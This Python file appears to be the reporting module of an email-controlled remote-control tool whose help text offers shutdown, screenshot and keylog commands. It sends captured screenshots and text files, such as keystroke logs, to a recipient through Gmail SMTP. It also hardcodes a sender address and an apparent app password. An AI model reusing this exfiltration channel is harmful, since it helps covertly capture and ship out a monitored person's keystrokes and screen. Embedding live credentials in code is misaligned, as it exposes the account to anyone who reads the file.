import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
import mail_handle_receive

smpt_host = 'smtp.gmail.com'
smpt_port = 587  # SSL 465, TLS 587
SENDER_EMAIL = 'dummymailbox5186@gmail.com'
SENDER_PASSWORD = "omwv msnm mxbx wllh"


def main():
    send_mail_success_execution('khuuthanhthien269@gmail.com',
                                'testing...', 'screenshots\screenshot_2023-10-06_23-17-18.png')


def send_mail_success_execution(recipient_mail, command, filename=None):
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = recipient_mail
    msg['Subject'] = "[Result] Remote Control Command"
    if command == 'help':
        help = 'Available commands: shutdown, screenshot, keylog'
    else:
        help = ''
    body = f'Executed successfully: {command}\n{help}'
    msg.attach(MIMEText(body, 'plain'))
    # if has attachment
    if filename != None:
        # image or plain text (binary or text)
        if filename.lower().endswith('.png'):
            attachment = open(filename, 'rb')
            file = MIMEImage(attachment.read(), name=filename)
        else:
            attachment = open(filename, 'r', encoding='utf-8')
            file = MIMEImage(attachment.read(), 'plain', name=filename)
        attachment.close()
        msg.attach(file)

    try:
        server = smtplib.SMTP(smpt_host, smpt_port)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, recipient_mail, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(e)


def send_mail_failure_execution(recipient_mail, command):
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = recipient_mail
    msg['Subject'] = "[Result] Remote Control Command"
    body = 'Failed to execute: ' + command
    msg.attach(MIMEText(body, 'plain'))
    try:
        server = smtplib.SMTP(smpt_host, smpt_port)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        text = msg.as_string()
        server.sendmail(SENDER_EMAIL, recipient_mail, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(e)


if __name__ == "__main__":
    main()
